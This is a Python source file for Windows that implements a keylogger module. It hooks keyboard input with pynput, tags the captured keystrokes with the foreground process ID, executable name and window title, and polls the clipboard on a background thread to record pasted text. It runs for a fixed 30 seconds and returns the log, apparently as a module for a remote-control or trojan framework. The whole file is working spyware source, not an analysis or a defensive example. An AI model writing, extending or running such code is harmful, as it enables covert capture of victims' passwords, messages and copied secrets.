import time
import threading
import win32clipboard
from ctypes import byref, create_string_buffer, c_ulong, windll
from pynput import keyboard

TIMEOUT = 30  # Duration for keylogging in seconds

class KeyLogger:
    def __init__(self):
        self.last_window = None
        self.current_window = None
        self.log = ""
        self.last_clipboard_content = None  # Track last clipboard content

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
            executable_name = executable.value.decode()
            
            if self.current_window != self.last_window:
                self.log += f"\n{process_id} {executable_name} {self.current_window}\n"
                self.last_window = self.current_window

        except UnicodeDecodeError:
            self.log += f"\n{process_id} {executable_name} Window title not available\n"

        windll.kernel32.CloseHandle(h_process)

    def on_press(self, key):
        self.get_current_process()
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
            else:
                if key == keyboard.Key.enter:
                    self.log += '\nReturn\n'
                elif key == keyboard.Key.space:
                    self.log += ' '
                elif key == keyboard.Key.backspace:
                    self.log = self.log[:-1]
                else:
                    self.log += f'[{key}]'
        except Exception as e:
            print(f"Error in on_press: {e}")

    def monitor_clipboard(self):
        """ Continuously monitor clipboard content for changes """
        while True:
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    content = win32clipboard.GetClipboardData()
                    if content != self.last_clipboard_content:
                        self.log += f"[PASTE] - {content}\n"  # Log clipboard content
                        self.last_clipboard_content = content
                win32clipboard.CloseClipboard()
            except Exception as e:
                print(f"Error accessing clipboard: {e}")
            time.sleep(0.5)  # Polling interval

def run():
    print("[*]In KeyLogger module.")
    kl = KeyLogger()
    # Start clipboard monitoring in a separate thread
    clipboard_thread = threading.Thread(target=kl.monitor_clipboard, daemon=True)
    clipboard_thread.start()

    start_time = time.time()
    with keyboard.Listener(on_press=kl.on_press) as listener:
        while time.time() - start_time < TIMEOUT:
            time.sleep(0.1)
        listener.stop()
    return kl.log